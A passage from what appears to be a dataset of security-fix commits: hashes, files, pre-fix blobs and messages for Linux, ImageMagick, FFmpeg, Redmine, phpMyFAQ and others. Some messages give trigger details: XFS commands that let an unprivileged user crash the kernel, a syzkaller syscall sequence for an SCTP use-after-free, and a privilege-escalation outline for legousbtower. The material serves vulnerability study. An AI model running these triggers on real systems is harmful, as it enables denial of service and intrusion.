    f03b5efa4e8ad432e0d51f0220fa65f290a4dbed
Blob(s) Before Fix: 
    4ecddc9f60d636dc5f785d0b4146052ce52040c4
Projects:
    mlaa_shibboleth
Commit Message for 1d65ad6786282d23ba1865f56e2fd19188e7c26a:
escape url after add_query_arg

======================================================================
Commit With Fix: 
    be111a470204a974c50682054c9c7d4b94396ed9
File(s) In Commit: 
    app/Plugin/CertAuth/Controller/Component/Auth/CertificateAuthenticate.php
Blob(s) In Commit: 
    1ad5c481ff9da0836771da4acec1f2b782283eb6
Blob(s) Before Fix: 
    ae04ae02eae02d4b21e15d89b721b70b30dbab65
    ce3d18db407b861c7c407cfa297e608778ed013e
Projects:
    0-vortex_MISP
Commit Message for be111a470204a974c50682054c9c7d4b94396ed9:
fix: Fix to certauth pains

======================================================================
Commit With Fix: 
    b31ff3cdf540110da4572e3e29bd172087af65cc
File(s) In Commit: 
    fs/xfs/xfs_linux.h
Blob(s) In Commit: 
    dcd1292664b3404b25bd93b9d40e58ab81d72376
Blob(s) Before Fix: 
    044fb0e15390c7c5538514ec2f49b72fa5942ade
    1455b25205a8ea88c858bb1206ce2def13255766
    201aae0b2662c5f8b2e334319bb9140208604833
    2d167fe643ece8a3a4bf1a9a6c0a83d7751c82fd
    3ebed168e5088a64d4f0232f091d0fb5d913d10c
    592fdf7111cbfb2e69d536cebe117eb00b2626be
    6282bfc1afa9387880826c5742d328a082de3919
    68640fb63a542346cac31553dd0aad1a78421a16
    7a989de224f4b77477e88e74e23d1be4272682be
    7c7842c85a082f92c99b25f6ca818c1bf32a7224
    7e5ab7e8191336e9e13852cb42cff4824d19b531
    800f896a6cc48cdffc19f85d6a9dd4c30ef897d5
    828662f70d64ec2f0bf43a66a6832c77debbdf18
    85f883dd6207bd41b6b2951111009cb5097ae339
    8a6e8ba6ab0dd6a83927a9932c864d6701dcc348
    9301c5a6060b68ee63d04cab873b4c4ab26c80c5
    99562ec0de56113e85aa4b60652239af671a0bd5
    b8d64d520e125ca1e1ad78742450f51ea04fe013
    c829344c8523fe24cc64194821f7ade081dd9bec
    ec0e239a0fa9070f30541b14f305b8d28c153339
    edbd5a210df22144ab810a67d88dac5f479b39f7
    f6586691d9893d626d2f88ec8268dd0813b31b6a
Projects:
    0-T-0_ps4-linux
Commit Message for b31ff3cdf540110da4572e3e29bd172087af65cc:
xfs: XFS_IS_REALTIME_INODE() should be false if no rt device present\n\nIf using a kernel with CONFIG_XFS_RT=y and we set the RHINHERIT flag on a directory in a filesystem that does not have a realtime device and create a new file in that directory, it gets marked as a real time file. When data is written and a fsync is issued, the filesystem attempts to flush a non-existent rt device during the fsync process.\n\nThis results in a crash dereferencing a null buftarg pointer in xfs_blkdev_issue_flush():\n\n  BUG: unable to handle kernel NULL pointer dereference at 0000000000000008   IP: xfs_blkdev_issue_flush+0xd/0x20   .....   Call Trace:     xfs_file_fsync+0x188/0x1c0     vfs_fsync_range+0x3b/0xa0     do_fsync+0x3d/0x70     SyS_fsync+0x10/0x20     do_syscall_64+0x4d/0xb0     entry_SYSCALL64_slow_path+0x25/0x25\n\nSetting RT inode flags does not require special privileges so any unprivileged user can cause this oops to occur.  To reproduce, confirm kernel is compiled with CONFIG_XFS_RT=y and run:\n\n  # mkfs.xfs -f /dev/pmem0   # mount /dev/pmem0 /mnt/test   # mkdir /mnt/test/foo   # xfs_io -c 'chattr +t' /mnt/test/foo   # xfs_io -f -c 'pwrite 0 5m' -c fsync /mnt/test/foo/bar\n\nOr just run xfstests with MKFS_OPTIONS="-d rtinherit=1" and wait.\n\nKernels built with CONFIG_XFS_RT=n are not exposed to this bug.\n\nFixes: f538d4da8d52 ("[XFS] write barrier support") Cc: <stable@vger.kernel.org> Signed-off-by: Richard Wareing <rwareing@fb.com> Signed-off-by: Dave Chinner <david@fromorbit.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7d63315a64267c565d1f34b9cb523a14616fed24
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    4756dba3f4cc417c2fa3b3f6517110a9be6ffb4d
Blob(s) Before Fix: 
    ae43f9cc364dcfdeae2b91dd17f872ad50dad965
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7d63315a64267c565d1f34b9cb523a14616fed24:
https://github.com/ImageMagick/ImageMagick/issues/654

======================================================================
Commit With Fix: 
    edbd58be15a957f6a760c4a514cd475217eb97fd
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    1c61af9af67dae10ea9675a45b191d7302c69151
Blob(s) Before Fix: 
    008a45ca31124ed5fa54d666fce61c7982b12a2f
    008bb34ee3240495ecb0ed65bf55d5edd20e1186
    0615c2a950fab992134d0071707b5b336f6fb231
    0f074c96f43f9eff16a22c2757e7d4ddbed6c661
    2b31a69d42a5705d91efc258ddad6eace8f73d6f
    2bd0d1949312c3d71c4b33529316dcfe76fa28f1
    33a4697d55394c0a73b5f88e3b19ecd0d923a878
    5f78df0805732bcff59e52ebce3a2f614d27686b
    82ca49fba33606d019f009b9f97c9370b2a0136a
    992396aa635ce1174f6e62f19ae3f19a550668c6
    a0dbe7ca8f724cd33b675ea15fb263d82041994c
    aa2d4000bafca07b5c8f006aa0c9667b867f23dc
    b43c4015b2f79678bb5a2edffdd4e57cf9bdb880
    b9e1a13b4ba36a0bc7edf6a8c2c116c7d48c970c
    d2238b204691b8e4f2e3acb9bc167b553ba32d50
    e3beb28203ebe06a4192ff80d4d0eb3b3741cf41
    e3eeed19cc7a130e80e24a3d67776a5b5a3c2698
    ea81ccf3c7d6a53095b4922329c25b566d5b5940
    f4001763134da35ed5f0f04bc2836015bb15a4af
Projects:
    0-T-0_ps4-linux
Commit Message for edbd58be15a957f6a760c4a514cd475217eb97fd:
packet: Don't write vnet header beyond end of buffer\n\n... which may happen with certain values of tp_reserve and maclen.\n\nFixes: 58d19b19cd99 ("packet: vnet_hdr support for tpacket_rcv") Signed-off-by: Benjamin Poirier <bpoirier@suse.com> Cc: Willem de Bruijn <willemb@google.com> Acked-by: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c42a1388a6d1bfd8001bf6a4241d8ca27e49326d
File(s) In Commit: 
    libavformat/rtpdec_h264.c
Blob(s) In Commit: 
    6f8148ab6d5db7e26aad1029a68d13844302029c
Blob(s) Before Fix: 
    1ca78bc81c283ccc77f73f925d804ecc1bdc5ddb
    2ac79dbf5eee5f5a1f4397e43fd494acfb203ce7
    401d6f632c08618ec13dbdf76f77789d32d88cd0
    8dd56a549e4443cabf4a34ba353735b0b7e2dc1a
    a785120c230972aecf7f8d59878fee7f67ac38ad
    b399be423e3532ccad1f6f0a09a790ca2bcd584e
Projects:
    00ERNEST00_FFmpeg
Commit Message for c42a1388a6d1bfd8001bf6a4241d8ca27e49326d:
avformat/rtpdec_h264: Fix heap-buffer-overflow\n\nFixes: rtp_sdp/poc.sdp\n\nFound-by: Bingchang <l.bing.chang.bc@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9292360c8b3898d0990983269f110cef21729090
File(s) In Commit: 
    mods/_standard/rss_feeds/edit_feed.php
Blob(s) In Commit: 
    4abac11edd47cf6ef636e7f5900f063583846906
Blob(s) Before Fix: 
    550a4ea7e188b69ea8f44f7d88288f27b7b7b0e0
Projects:
    AMEDUBD_ATutor
Commit Message for 9292360c8b3898d0990983269f110cef21729090:
5815 added htmlspecialchars to filter URL var before going to the db.

======================================================================
Commit With Fix: 
    3e0097499839e0fe3af380410eababe5a47c4cf9
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    0419c2298eabdb8f80897357a04be66e85e9a4ac
Blob(s) Before Fix: 
    070332eb41f33de2c765bedc724f50f404af62a9
    0a38ba01b7b4aac2151faf88421c8f2645dbd86a
    0b60245bd7400f0322f37f3978ee2001580b39c4
    1a9de84199970f24bb49c5e6c623ea20263203a7
    1acdb6e03999847c93688e1762dcf2b3b8f715bd
    1e82d4128a84800d3f96011c49e0b3fc12c55d8e
    21225d62b0c1f4424bc72f57f8daf109cabffb7e
    225abaad4d1cc86f462574a8143bc2ffb2cc69a8
    29b86505f796d9fa57c19b958c1c7ae4ef31b298
    4fe606b000b4461c05e441cbb787edcfec51e72b
    503ab8b46c0b4e8a73d7e826ba1aaf3be1abd6b0
    82c33a6edbeaa7a00e6f7840ef4b5d8cdb8a084f
    84e782d8e7c3f0cb8dd4c3bdedb46b7060b18f1e
    9d7b7db75e4b96b6fbb33bf24b91c205add07d79
    ae7d9bdf409c816d014ac2d668a1e449fce0c8e9
    cf0e71db9e5146068294ab46fb1db1fa69addbc9
    d7ff71e0c85c6ecd525d0d59d3f3f0da63952b47
    dbe5b4b95df0d9d317dbdc2261914e4d8771991f
    df5e961484e108312f6f01765882dd4319d584f7
    e831e01f9fa68546083ae43c82d708980425d83c
    f098877eed4aa83fb4c1245e49b378a7699389d5
Projects:
    0-T-0_ps4-linux
Commit Message for 3e0097499839e0fe3af380410eababe5a47c4cf9:
scsi: sg: fixup infoleak when using SG_GET_REQUEST_TABLE\n\nWhen calling SG_GET_REQUEST_TABLE ioctl only a half-filled table is returned  the remaining part will then contain stale kernel memory information.  This patch zeroes out the entire table to avoid this issue.\n\nSigned-off-by: Hannes Reinecke <hare@suse.com> Reviewed-by: Bart Van Assche <bart.vanassche@wdc.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    241988ca28139ad970c1d9717c419f41e360ddb0
File(s) In Commit: 
    coders/ycbcr.c
Blob(s) In Commit: 
    7e7d4b45741bd5baf4b1095856c553223d7bdff4
Blob(s) Before Fix: 
    a2623e84298b1ed290f416d0bd918c75a99431ff
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 241988ca28139ad970c1d9717c419f41e360ddb0:
fix memory leak in ReadYCBCRImage as SetImageExtent failure

======================================================================
Commit With Fix: 
    ef8f40689ac452398026c07da41656a7c87e4683
File(s) In Commit: 
    coders/yuv.c
Blob(s) In Commit: 
    6eeac3d557fd59d3b55bd00eb7d11740affdc974
Blob(s) Before Fix: 
    3a8f65ce302b47ef64ac099e38db8f0788e0d089
    3e3797a69b349948f632bed65172b54afa3897d9
    a203ea76819753ec6f3b7ab68e115aa24abb1e40
Projects:
    2016repotsheyue_ImageMagick
Commit Message for ef8f40689ac452398026c07da41656a7c87e4683:
fix multiple memory leak in ReadYUVImage

======================================================================
Commit With Fix: 
    fbb687db1088ddd894d975996e5f6a4252b9a2b4
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_crypto_openssl.c
Blob(s) In Commit: 
    ac107c2c1b67dd57cfd57ba5ec07409ffdb18a29
Blob(s) Before Fix: 
    4b86a6f302ddc7a12d17eded25f0695b5a25dd21
    74fffbf3212992ebf4d94da05c5af74d22d27d39
    f7640baf14ccd00af9df09cb91559d01412f41bb
Projects:
    3van_krb5
Commit Message for fbb687db1088ddd894d975996e5f6a4252b9a2b4:
Fix PKINIT cert matching data construction\n\nRewrite X509_NAME_oneline_ex() and its call sites to use dynamic allocation and to perform proper error checking.\n\nticket: 8617 target_version: 1.16 target_version: 1.15-next target_version: 1.14-next tags: pullup

======================================================================
Commit With Fix: 
    2fae9e5a7babada041e2e161699ade2447a01989
File(s) In Commit: 
    drivers/usb/misc/legousbtower.c
Blob(s) In Commit: 
    c8fbe7b739a0bb110cdfbca9e82bc7238adf5e08
Blob(s) Before Fix: 
    4dd531ac5a7ffe0ecde019bc0d7024674f9f0ee9
    5752220427677c56188597fed2de929bb5fd17c6
    7771be3ac178ea0e95ca7da1f85ff55543ff4a00
    80894791c02003fb8ee628e8ed722411bb174ee9
    97cd9e24bd25b30dbfb9e7cbfd9f35a86728b243
    9dd202ba166305354fbc184d65988558c9ad9565
    a2702cbfe804c9629005184f17c78ca16918d247
    c2e2b2ea32d80e7966bdf7becbb4f8728fa42e97
    dd4580cb57e0d6624e530da5f20c06a2fd7dd704
    eb37c9542052846396c9c38ea7cc3da7079266ab
    ece9b3c1eaac2959bafefcaf7205a76799a94e50
Projects:
    0-T-0_ps4-linux
Commit Message for 2fae9e5a7babada041e2e161699ade2447a01989:
usb: misc: legousbtower: Fix NULL pointer deference\n\nThis patch fixes a NULL pointer dereference caused by a race codition in the probe function of the legousbtower driver. It re-structures the probe function to only register the interface after successfully reading the board's firmware ID.\n\nThe probe function does not deregister the usb interface after an error receiving the devices firmware ID. The device file registered (/dev/usb/legousbtower%d) may be read/written globally before the probe function returns. When tower_delete is called in the probe function (after an r/w has been initiated), core dev structures are deleted while the file operation functions are still running. If the 0 address is mappable on the machine, this vulnerability can be used to create a Local Priviege Escalation exploit via a write-what-where condition by remapping dev->interrupt_out_buffer in tower_write. A forged USB device and local program execution would be required for LPE. The USB device would have to delay the control message in tower_probe and accept the control urb in tower_open whilst guest code initiated a write to the device file as tower_delete is called from the error in tower_probe.\n\nThis bug has existed since 2003. Patch tested by emulated device.\n\nReported-by: James Patrick-Evans <james@jmp-e.com> Tested-by: James Patrick-Evans <james@jmp-e.com> Signed-off-by: James Patrick-Evans <james@jmp-e.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    07f26e213196936fb328ea0c1d5a66a09d8b5440
File(s) In Commit: 
    keycloak_httpd_client/keycloak_cli.py
Blob(s) In Commit: 
    bcbf2be82aa370482f428194bcdfd52886416fea
Blob(s) Before Fix: 
    3bd88f132f9ddeb1f89244a8c936b9aa3d3af6bc
    d703da33b556314bb9703e67972e3015e907591f
Projects:
    jdennis_python-keycloak
Commit Message for 07f26e213196936fb328ea0c1d5a66a09d8b5440:
CVE-2017-15111 unsafe /tmp log file in --log-file option in keycloak_cli.py\n\nkeycloak_cli.py is essentially a set of utilities used by the keycloak-httpd-client-install tool. It can be invoked on it's own, mostly for testing or to execute just one part of the Keycloak REST API. It's log file defaulted to /tmp/{prog_name}.log where prog_name is the name of the program that invoked it. That default was changed to {prog_name}.log so the log file is created in the current directory instead of under /tmp. Use of the /var/log directory was avoided because that requires root privileges.

======================================================================
Commit With Fix: 
    df80cd9b28b9ebaa284a41df611dbf3a2d05ca74
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    17841ab30798ecb2d7269296dcda3c62d434d622
Blob(s) Before Fix: 
    1b5d669e30292a57ed57dd920d81be2a57f97b22
    1db478e345203f75733044d843a763cc3a3966e1
    465a9c8464f9477f827c14cbdab6879ac181a507
    6f45d1713452df982a985e1e882c964259ad9e20
    8812e1bf6c1c18fa7e20fdc478633615630162b6
    897c01c029cab3d5805cc56b0964c70e06f4143a
    8d760863bc411023835b20383620f38d14ee2df1
    b5321486fbed300106844584d1764181342d8e35
    d4730ada7f3233367be7a0e3bb10e286a25602c8
    f16c8d97b7f313e9f671d8bb8620b0f9566e619f
Projects:
    0-T-0_ps4-linux
Commit Message for df80cd9b28b9ebaa284a41df611dbf3a2d05ca74:
sctp: do not peel off an assoc from one netns to another one\n\nNow when peeling off an association to the sock in another netns, all transports in this assoc are not to be rehashed and keep use the old key in hashtable.\n\nAs a transport uses sk->net as the hash key to insert into hashtable, it would miss removing these transports from hashtable due to the new netns when closing the sock and all transports are being freeed, then later an use-after-free issue could be caused when looking up an asoc and dereferencing those transports.\n\nThis is a very old issue since very beginning, ChunYu found it with syzkaller fuzz testing with this series:\n\n  socket$inet6_sctp()   bind$inet6()   sendto$inet6()   unshare(0x40000000)   getsockopt$inet_sctp6_SCTP_GET_ASSOC_ID_LIST()   getsockopt$inet_sctp6_SCTP_SOCKOPT_PEELOFF()\n\nThis patch is to block this call when peeling one assoc off from one netns to another one, so that the netns of all transport would not go out-sync with the key in hashtable.\n\nNote that this patch didn't fix it by rehashing transports, as it's difficult to handle the situation when the tuple is already in use in the new netns. Besides, no one would like to peel off one assoc to another netns, considering ipaddrs, ifaces, etc. are usually different.\n\nReported-by: ChunYu Wang <chunwang@redhat.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Acked-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1a29ed2f96da1be22fa5a4d96c7583aa81b8b060
File(s) In Commit: 
    src/lib-auth/auth-client-request.c
Blob(s) In Commit: 
    046f7c307dbf8aa060c2532e948234d3113dce43
Blob(s) Before Fix: 
    480fb42b304065588a4e472c926adbb074db7892
Projects:
    001101_server
Commit Message for 1a29ed2f96da1be22fa5a4d96c7583aa81b8b060:
lib-auth: Fix memory leak in auth_client_request_abort()\n\nThis caused memory leaks when authentication was aborted. For example with IMAP:\n\na AUTHENTICATE PLAIN *\n\nBroken by 9137c55411aa39d41c1e705ddc34d5bd26c65021

======================================================================
Commit With Fix: 
    93f661d8adcfa6618b11522cdab30e97bada33fd
File(s) In Commit: 
    include/global_session.php
Blob(s) In Commit: 
    5e38729ebb2bc4b127e688f39b73b8e0c86d1b8a
Blob(s) Before Fix: 
    f2587384e9b6dd7189c343dd86e36d69a240d858
Projects:
    3yahya_cacti
Commit Message for 93f661d8adcfa6618b11522cdab30e97bada33fd:
XSS fix (#1017)\n\nFix for issue #1010

======================================================================
Commit With Fix: 
    5649645d725c73df4302428ee4e02c869248b4c5
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    94c2790f82839adb260dc2af00907c24c5f40826
Blob(s) Before Fix: 
    447a7d5cee0f56ebcb1847d9442f6407e259be98
Projects:
    0-T-0_ps4-linux
Commit Message for 5649645d725c73df4302428ee4e02c869248b4c5:
KEYS: fix dereferencing NULL payload with nonzero length\n\nsys_add_key() and the KEYCTL_UPDATE operation of sys_keyctl() allowed a NULL payload with nonzero length to be passed to the key type's ->preparse(), ->instantiate(), and/or ->update() methods.  Various key types including asymmetric, cifs.idmap, cifs.spnego, and pkcs7_test did not handle this case, allowing an unprivileged user to trivially cause a NULL pointer dereference (kernel oops) if one of these key types was present.  Fix it by doing the copy_from_user() when 'plen' is nonzero rather than when '_payload' is non-NULL, causing the syscall to fail with EFAULT as expected when an invalid buffer is specified.\n\nCc: stable@vger.kernel.org # 2.6.10+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    5dde2efe0d2b3a47d17439e03acabb7ea2befb64
File(s) In Commit: 
    src/Umbraco.Web/umbraco.presentation/umbraco/dialogs/importDocumenttype.aspx.cs
Blob(s) In Commit: 
    147e7604c125ea1d9e807c4726925a813f327be3
Blob(s) Before Fix: 
    27c1724bfffe43b9c03d8d0f7773b97d563447fb
Projects:
    0Neji_Umbraco-CMS
Commit Message for 5dde2efe0d2b3a47d17439e03acabb7ea2befb64:
U4-10506 Importing a specially crafted document type file can cause XXE attack

======================================================================
Commit With Fix: 
    0b5a5258abbeaf8a0c3a18c7e753699787fdf46e
File(s) In Commit: 
    sql/event_data_objects.cc
Blob(s) In Commit: 
    90e839debb549c18b3e3fbbeeec1814ae3f575b8
Blob(s) Before Fix: 
    6ef9fa9f8efe57d9b895762034be70fb3eb7c250
    9e1ee6f30f9cc3419ddf846ddb02bce82da40f33
    c85192ee258087b41a41959e4b7165c8071c3a39
    e494b4a429bca005a5f09693df1f5330fec97b1a
Projects:
    0xAX_mariadb-server
Commit Message for 0b5a5258abbeaf8a0c3a18c7e753699787fdf46e:
MW-416 DDL replication moved after acl checking\n\ngalera_events test shows a regression with the original fix for MW-416 Reason was that Events::drop_event() can be called also from inside event execution, and there we have a speacial treatment for event, which executes "DROP EVENT" statement, and runs TOI replication inside the event processing body. This resulted in executing WSREP_TO_ISOLATION two times for such DROP EVENT statement. Fix is to call WSREP_TO_ISOLATION_BEGIN only in Events::drop_event()

======================================================================
Commit With Fix: 
    90d4c44a0dd0d65c6fb3ab2417b83d700c8413ae
File(s) In Commit: 
    client-report.php
Blob(s) In Commit: 
    5387011e307b7a84ce2f9b98ec07626466427e68
Blob(s) Before Fix: 
    0110ecc8a3721dd8287fec9fd893076b10c04be7
    6acc94918611589624ebec6f33e21151f96ee44a
    6ffcfccc18e4e57628c589e722c586f39537da04
Projects:
    MansM_bacula-web
Commit Message for 90d4c44a0dd0d65c6fb3ab2417b83d700c8413ae:
Ensure provided period is a valid integer and a known value\n\n  - if provided period is not an integer or a known value, we     raise an exception

======================================================================
Commit With Fix: 
    21a6f570ba33fa9f52f1bba87f07acc4e8c178f4
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    90f6acd301b5a72e061daf77af1699fe15109319
Blob(s) Before Fix: 
    0235e0c5e4643b16a9fa3f77d043bc38e80726d1
Projects:
    0-T-0_radare2
Commit Message for 21a6f570ba33fa9f52f1bba87f07acc4e8c178f4:
Fix #8685 - Crash in ELF version parsing

======================================================================
Commit With Fix: 
    94f7cfbf990028348b9262578acbc53a94fce448
File(s) In Commit: 
    app/helpers/application_helper.rb
Blob(s) In Commit: 
    ef229f955388fc1786ea5266810165313e259c3f
Blob(s) Before Fix: 
    2a5acc4774454034e9ea90ee8b7b23ca666c62ff
    cb0c2771568fede65657d2ce9e45e1bd10f99015
Projects:
    01022012_redmine
Commit Message for 94f7cfbf990028348b9262578acbc53a94fce448:
Ensure that values of multi-value fields are HTML-escaped in issue history (#27186).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16985 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    56c8ee0440d8555aa7822d947ba9091c8a791508
File(s) In Commit: 
    app/helpers/queries_helper.rb
Blob(s) In Commit: 
    a4c3c3e7b3f20816be4d3fca87220dc5b6984dac
Blob(s) Before Fix: 
    458fb70fdf01976d85792f9524e2eefbfd83e3bf
    acab44536c8f309740d93660501f65cafdc024db
Projects:
    01022012_redmine
Commit Message for 56c8ee0440d8555aa7822d947ba9091c8a791508:
Ensure that values of multi-value fields are HTML-escaped in issue list (#27186).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16984 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    1a0976417975a128b0a932ba1552c37e9414953b
File(s) In Commit: 
    app/views/timelog/_list.html.erb
Blob(s) In Commit: 
    6f126b0f7a04bf5904fa52a52edb4d4638da0b1e
Blob(s) Before Fix: 
    019ddbb53fe4bfa6ee16c5f06a0bd4f9094e09c2
    0fb72aeb407aa351544470899f7e6b728e0a7bb2
    21115dfde25c5ebbcd28d0c8ebbc1040162eaceb
    5ee9eea6749b1763fcc43d7e1fbf0c97b76f5f0e
    89e1bc8c36fc15cfb5d3b1b6b690241c41d7f810
    d257375d52814e3fe3adf061a4a7f3930d1cf32d
Projects:
    01022012_redmine
Commit Message for 1a0976417975a128b0a932ba1552c37e9414953b:
Don't use raw output in timelog (#27186).\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16983 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    273dd9cb3bcfb1e0a0b90570b3b34eafa07d67aa
File(s) In Commit: 
    app/views/issues/_list.html.erb
Blob(s) In Commit: 
    8024a694822901ed2530fde1c9bc159343ad5abf
Blob(s) Before Fix: 
    02486678229d130d586c4b7fb404a12e4cf74f87
    0bb2a67477d2cbc195a316568abb960bdda006ef
    2126f632ead76ac9ed57e2442f57a2859c21ec11
    26287e75c0905b87363d01aad3911f9e1e6f485b
    5488fb295906343c8c26eb4d1c739e786e76aa71
    7e34fca24dfc44048d4715472b575e231e235697
    c6c7613b48ba6d584713eb9ef8226bd02e7d5155
Projects:
    01022012_redmine
Commit Message for 273dd9cb3bcfb1e0a0b90570b3b34eafa07d67aa:
Don't use raw output (#27186).\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16971 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    5c3e4f96ff0ef6b91a3f0aa64eb28197c5cf5435
File(s) In Commit: 
    phpmyfaq/admin/attachment.php
Blob(s) In Commit: 
    f1fcb0e5b6e4cee649ad18a25fe8bd8a473b5207
Blob(s) Before Fix: 
    5312273b8d32ccff5833c14d0cf9dedcec4435e9
Projects:
    14wind_phpMyFAQ
Commit Message for 5c3e4f96ff0ef6b91a3f0aa64eb28197c5cf5435:
Prevent users to upload HTML files as attachments

======================================================================
Commit With Fix: 
    cce47f94375bb0102ab4f210672231dbb854dd0d
File(s) In Commit: 
    phpmyfaq/admin/stat.ratings.php
Blob(s) In Commit: 
    2874b23d6e1dd6f5414aa8e053af78a078e3cb98
Blob(s) Before Fix: 
    7ea49fe6f284493941d5afbd82fa91c3bd950dc7
Projects:
    14wind_phpMyFAQ
Commit Message for cce47f94375bb0102ab4f210672231dbb854dd0d:
Fixed possible direct calls

======================================================================
Commit With Fix: 
    fadb9a70b5f7624a6926b8834d5c6001c210f09c
File(s) In Commit: 
    phpmyfaq/admin/stat.adminlog.php
Blob(s) In Commit: 
    5847c6060cfe7c20f7d7e2723105b23e078b2d1e
Blob(s) Before Fix: 
    91cce67145e01cbcbd47f1d1bc15706774d4769a
Projects:
    14wind_phpMyFAQ
Commit Message for fadb9a70b5f7624a6926b8834d5c6001c210f09c:
Added missing CSRF protection

======================================================================
Commit With Fix: 
    ec8b3cc37d05b6625e24916b8f7253f830015b5f
File(s) In Commit: 
    phpmyfaq/admin/news.php
Blob(s) In Commit: 
    1bf0657e71495cfba48050747445e4d59f776d50
Blob(s) Before Fix: 
    c204df0f00869303f04d0095d6fb961d8709b4e5
Projects:
    14wind_phpMyFAQ
Commit Message for ec8b3cc37d05b6625e24916b8f7253f830015b5f:
Added missing CSRF check

======================================================================
Commit With Fix: 
    fa26c52384b010edaf60c525ae5b040f05da9f77
File(s) In Commit: 
    phpmyfaq/admin/stat.main.php
Blob(s) In Commit: 
    91ed72d6e676172fc143dbb4c71a39061d9786b5
Blob(s) Before Fix: 
    5e7482912b0e2aa41489dfea467ad0dde515310f
    e22fa3462041d060a3cff9d783a6ffaca17f1ce3
Projects:
    14wind_phpMyFAQ
Commit Message for fa26c52384b010edaf60c525ae5b040f05da9f77:
Added missing CSRF protection

======================================================================
Commit With Fix: 
    71bb99a02b32b4cc4265118e85f6035ca72923f0
File(s) In Commit: 
    net/bluetooth/bnep/core.c
Blob(s) In Commit: 
    ce82722d049b7c013fd06f66f726fbbf75a01f56
Blob(s) Before Fix: 
    031d7d656754936ab6c43ae124b339a87fb8f534
    05f57e491ccbd614a1d306c49df891e4a2ec00c6
    85bcc21e84d2006c4839b2b7f409f2595cb41858
    a42ba170870370c927f642a98ab3d208477e45bf
    a5b639702637404d5c1955b36163a3c459fe174c
    a779ec703323ce7293522e3cdb7af1d41b3c58a2
    a841d3e776c5e091c19efea8423750edd018e946
    c7a19a15d7606d7eb266b62d599750e37f3a7b79
    d9edfe8bf9d677268cfc1f1e10b85f04d9f00f73
    e430b1abcd2fabf102d15cd4f99399c983fcf9f2
Projects:
    0-T-0_ps4-linux
Commit Message for 71bb99a02b32b4cc4265118e85f6035ca72923f0:
Bluetooth: bnep: bnep_add_connection() should verify that it's dealing with l2cap socket\n\nsame story as cmtp\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    a6981567e8e215acc1ef690c8dbb30f2d9b00a19
File(s) In Commit: 
    usr.bin/ssh/sftp-server.c
Blob(s) In Commit: 
    42249ebd60d0f46a2219d61203a30e0da65d38ec
Blob(s) Before Fix: 
    2510d234a3a21dce7ab192b3d5aa56533f7a57b5
    b16c90363075b91dc117a3ee36001a944eca189d
    cc1e5e2f2fec2967e8ca9a9d3af6971b6f36d92e
Projects:
    Luigi30_src
Commit Message for a6981567e8e215acc1ef690c8dbb30f2d9b00a19:
disallow creation (of empty files) in read-only mode  reported by Michal Zalewski, feedback & ok deraadt@

======================================================================
Commit With Fix: 
    c6d0076c924891ad9948a62d89d0bcdaf965f0cd
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    e3c852fd33de239204f4b3680c77fa525b493b13
Blob(s) Before Fix: 
    90f6acd301b5a72e061daf77af1699fe15109319
Projects:
    0-T-0_radare2
Commit Message for c6d0076c924891ad9948a62d89d0bcdaf965f0cd:
Fix #8731 - Crash in ELF parser with negative 32bit number

======================================================================
Commit With Fix: 
    44ded3ff35b8264f54b5a900cab32ec489d9e5b9
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    2248731b38a2cdb53b3ef9c8563fd8ec3f08e8fc
Blob(s) Before Fix: 
    e3c852fd33de239204f4b3680c77fa525b493b13
Projects:
    0-T-0_radare2
Commit Message for 44ded3ff35b8264f54b5a900cab32ec489d9e5b9:
Fix #8743 - Crash in ELF version parser on 32bit systems

======================================================================
Commit With Fix: 
    4043718264095cde6623c2cbe8c644541036d7bf
File(s) In Commit: 
    src/agent/Core/SpawningKit/Spawner.h
Blob(s) In Commit: 
    99dedb852f581ce4b533a79e93a3e33deff93fc3
Blob(s) Before Fix: 
    e65034ae91baa42c718a95794afa202dde8bec1b
Projects:
    10thfloor_passenger
Commit Message for 4043718264095cde6623c2cbe8c644541036d7bf:
Disable unused feature.

======================================================================
Commit With Fix: 
    0b973e28166636e0ff1fad80baa0385c9c09c53a
File(s) In Commit: 
    libr/bin/format/elf/elf.c
